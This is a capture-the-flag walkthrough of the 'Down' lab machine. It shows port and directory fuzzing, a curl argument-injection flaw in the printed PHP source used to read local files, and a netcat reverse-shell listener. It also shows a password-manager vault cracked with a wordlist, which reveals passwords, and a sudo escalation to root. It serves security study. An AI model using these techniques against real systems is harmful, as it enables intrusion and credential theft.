---
categories:
- Vulnlab
image:
  path: Pasted image 20251016122835.png
layout: post
media_subpath: /assets/images/down
tags:
- ssfr
- command-injection
- password cracking
- pswm(python password manager)
- hackthebox
title: Lab - Down Walkthrough
---
# Introduction
Down is a Linux machine that challenges testers to identify and exploit web application vulnerabilities, particularly in input validation and URL parsing. The initial foothold is gained through command injection via improper input sanitization, followed by lateral movement using credentials discovered in a Python password manager. Privilege escalation is achieved through misconfigured sudo permissions.
## Recon
### Port Scan
I start off with a `nmap` scan to identify open ports and services
```
nmap -sC -sV -oA nmap/Down 10.129.234.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 20:20 EAT
Nmap scan report for 10.129.234.87
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Is it down or just me?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
```
Their are  2 ports open 22(ssh) and 80(http). `Nmap` leaks that the Operating System is Ubuntu so its a linux machine. Also the web server is running Apache

### Port 80
Visiting the website I get this page
![image](Pasted image 20251015202324.png)
In the Url input I put the page itself and its reflected back
![image](Pasted image 20251015202452.png)
Before I continue I decide to put a directory brute force so as to identify hidden files and directories but I find nothing
```
ffuf -u http://10.129.234.87/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -ic -c -e .php,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.87/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 739, Words: 131, Lines: 28, Duration: 204ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 203ms]
                        [Status: 200, Size: 739, Words: 131, Lines: 28, Duration: 204ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 163ms]
```
Going back I noticed that when I put in an invalid url it said it was down 
![image](Pasted image 20251015202809.png)
So am thinking maybe their is another port open locally I can try and access that. So I send the request to burp and save it to a file. Then with `ffuf` I perform the fuzzing but I find nothing
```
ffuf -u http://10.129.234.87/ -request url.req -w <(seq 1 65535) -mr 'It is up. It'       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.129.234.87/
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Origin: http://10.129.234.87
 :: Header           : Connection: keep-alive
 :: Header           : Host: 10.129.234.87
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Referer: http://10.129.234.87/index.php
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Data             : url=http://localhost:FUZZ/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: It is up. It
________________________________________________

80                      [Status: 200, Size: 1961, Words: 271, Lines: 54, Duration: 175ms]
:: Progress: [65535/65535] :: Job [1/1] :: 23 req/sec :: Duration: [0:17:37] :: Errors: 0 ::
```
The other thing was to see if maybe their is another parameter but I find nothing
```
	 ffuf -u http://10.129.234.87/ -request url.req -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fl 28

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.129.234.87/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Referer: http://10.129.234.87/index.php
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : Host: 10.129.234.87
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Origin: http://10.129.234.87
 :: Header           : Connection: keep-alive
 :: Data             : FUZZ=http://localhost/index.php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 28
________________________________________________

url                     [Status: 200, Size: 1961, Words: 271, Lines: 54, Duration: 176ms]
:: Progress: [6453/6453] :: Job [1/1] :: 249 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```
So I decide to see if other protocols are supported but it seems not
![image](Pasted image 20251015210613.png)
I sent the request to burp and noticed something. When it starts with `http://` it seems to work
![image](Pasted image 20251015211021.png)
![image](Pasted image 20251015211038.png)
When I put in a value in the first part `http://localhost/index.php` but without a space it still doesn't return a 404 not found since it extends the name `index.php` and it doesn't exist
![image](Pasted image 20251015211308.png)
![image](Pasted image 20251015211324.png)
But when I separate the 2 I can read the file
![image](Pasted image 20251015211411.png)
![image](Pasted image 20251015211440.png)

### Auth As www
With this information I leaked the source code for `index.php` located at the web root
![image](Pasted image 20251015211738.png)
![image](Pasted image 20251015211754.png)
I saved the file to anaylse how it works . So their is is a hidden parameter `expertmode` and if its set to `tcp` it will require a ip and port number to be supplied and then it will perform a `netcat` to see it the port is open or not
```
cat index.php                                    
<?php
if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
  echo '<h1>Is the port refused, or is it just you?</h1>
        <form id="urlForm" action="index.php?expertmode=tcp" method="POST">
            <input type="text" id="url" name="ip" placeholder="Please enter an IP." required><br>
            <input type="number" id="port" name="port" placeholder="Please enter a port number." required><br>
            <button type="submit">Is it refused?</button>
        </form>';
} else {
  echo '<h1>Is that website down, or is it just you?</h1>
        <form id="urlForm" action="index.php" method="POST">
            <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>
            <button type="submit">Is it down?</button>
        </form>';
}

if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
  $ip = trim($_POST['ip']);
  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
  $port = trim($_POST['port']);
  $port_int = intval($port);
  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
  if ( $valid_ip && $valid_port ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
    exec($ec . " 2>&1",$output,$rc);
    echo '<div class="output" id="outputSection">';
    if ( $rc === 0 ) {
      echo "<font size=+1>It is up. It's just you! 😝</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    } else {
      echo "<font size=+1>It is down for everyone! 😔</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    }
  } else {
    echo '<div class="output" id="outputSection">';
    echo '<font color=red size=+1>Please specify a correct IP and a port between 1 and 65535.</font>';
  }
} elseif (isset($_POST['url'])) {
  $url = trim($_POST['url']);
  if ( preg_match('|^https?://|',$url) ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/curl -s $url");
    exec($ec . " 2>&1",$output,$rc);
    echo '<div class="output" id="outputSection">';
    if ( $rc === 0 ) {
      echo "<font size=+1>It is up. It's just you! 😝</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    } else {
      echo "<font size=+1>It is down for everyone! 😔</font><br><br>";
    }
  } else {
    echo '<div class="output" id="outputSection">';
    echo '<font color=red size=+1>Only protocols http or https allowed.</font>';
  }
}
?>
```
To test this I will put in the localhost  and port 22 to see if it detects its open and it works
![image](Pasted image 20251016111356.png)
With this I can be able to get a reverse shell . So I started my `netcat` listener and got the reverse shell as `www-data`
![image](Pasted image 20251016111658.png)
```
rlwrap nc -nlvp 9001                        
listening on [any] 9001 ...
connect to [10.10.14.210] from (UNKNOWN) [10.129.234.87] 38730
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@down:/var/www/html$ export TERM=xtem
export TERM=xtem
www-data@down:/var/www/html$ whoami
whoami
www-data
www-data@down:/var/www/html$ 
```
The first flag can be obtained here `/var/www/html/user_aeT1xa.txt`

## Privilege Escalation
### Initial Enumeration
Looking at the home folder of the user `aleks` I find a `pswm`folder under `.local` with an encrypted string 
```
www-data@down:/home/aleks$ cd .local
cd .local
www-data@down:/home/aleks/.local$ ls -la
ls -la
total 12
drwxrwxr-x 3 aleks aleks 4096 Sep  6  2024 .
drwxr-xr-x 5 aleks aleks 4096 May 27 23:51 ..
drwxrwxr-x 3 aleks aleks 4096 Sep 13  2024 share
www-data@down:/home/aleks/.local$ cd sha
cd share/
www-data@down:/home/aleks/.local/share$ ls -la
ls -la
total 12
drwxrwxr-x 3 aleks aleks 4096 Sep 13  2024 .
drwxrwxr-x 3 aleks aleks 4096 Sep  6  2024 ..
drwxrwxr-x 2 aleks aleks 4096 Sep 13  2024 pswm
www-data@down:/home/aleks/.local/share$ cd 
cd pswm/
www-data@down:/home/aleks/.local/share/pswm$ ls -la
ls -la
total 12
drwxrwxr-x 2 aleks aleks 4096 Sep 13  2024 .
drwxrwxr-x 3 aleks aleks 4096 Sep 13  2024 ..
-rw-rw-r-- 1 aleks aleks  151 Sep 13  2024 pswm
www-data@down:/home/aleks/.local/share/pswm$ cd 
cd pswm 
bash: cd: pswm: Not a directory
www-data@down:/home/aleks/.local/share/pswm$ cat p
cat pswm 
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data@down:/home/aleks/.local/share/pswm$ cat pswm;echo
cat pswm;echo
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
www-data@down:/home/aleks/.local/share/pswm$ 
```
### Password Manager Analysis
Looking online I find that this is a [python password manager](https://github.com/Julynx/pswm) . Then I found this [repo](https://github.com/seriotonctf/pswm-decryptor) that  for decrpting the encrypted string where I find aleks password
```
python3 pswm-decrypt.py -h         
usage: pswm-decrypt.py [-h] -f FILE -w WORDLIST

pswm master password cracker

options:
  -h, --help               show this help message and exit
  -f, --file FILE          Path to the encrypted file
  -w, --wordlist WORDLIST  Path to the wordlist file
                                                                                                                     
┌──(.env)─(null㉿shadow)-[~/…/Vulnhub/Down/files/pswm-decryptor]
└─$ python3 pswm-decrypt.py -f ../pswm.hash -w /usr/share/wordlists/rockyou.txt
[+] Master Password: flower
[+] Decrypted Data:
+------------+----------+----------------------+
| Alias      | Username | Password             |
+------------+----------+----------------------+
| pswm       | aleks    | flower               |
| aleks@down | aleks    | 1uY3w22uc-Wr{xNHR~+E |
```
### Access as aleks
Then I got a shell via `ssh`
```
ssh aleks@10.129.234.87                      
The authenticity of host '10.129.234.87 (10.129.234.87)' can't be established.
ED25519 key fingerprint is SHA256:uq3+WwrPajXEUJC3CCuYMMlFTVM8CGYqMtGB9mI29wg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.87' (ED25519) to the list of known hosts.
(aleks@10.129.234.87) Password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 System information as of Thu Oct 16 08:29:38 AM UTC 2025

  System load:           0.0
  Usage of /:            65.4% of 6.92GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.129.234.87
  IPv6 address for eth0: dead:beef::250:56ff:fe94:aa9a
Last login: Tue Jun 10 15:47:07 2025 from 10.10.14.67
aleks@down:~$ 
```
### Sudo Privileges
Running `sudo -l` I find that we can execute everything with root privileges 
```
aleks@down:~$ sudo -l
[sudo] password for aleks: 
Matching Defaults entries for aleks on down:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User aleks may run the following commands on down:
    (ALL : ALL) ALL
```
So I went ahead and got the root shell with `sudo su`
```
aleks@down:~$ sudo su
root@down:/home/aleks# cd /root
root@down:~# ls -la
total 48
drwx------  6 root root 4096 May 27 23:54 .
drwxr-xr-x 20 root root 4096 May 27 22:03 ..
lrwxrwxrwx  1 root root    9 May  1 22:31 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwxr-xr-x  3 root root 4096 Apr 21 10:53 .cache
-rw-------  1 root root   20 May 27 23:54 .lesshst
drwxr-xr-x  3 root root 4096 Sep 15  2024 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-r------w-  1 root root   33 Apr  8  2025 root.txt
-rw-r--r--  1 root root   66 Apr  8  2025 .selected_editor
drwx------  3 root root 4096 Sep  6  2024 snap
drwx------  2 root root 4096 Sep  6  2024 .ssh
-rw-r--r--  1 root root    0 May  1 22:26 .sudo_as_admin_successful
-rw-------  1 root root 2444 May 27 13:06 .viminfo
```
The root flag can be obtained at `/root/root.txt`


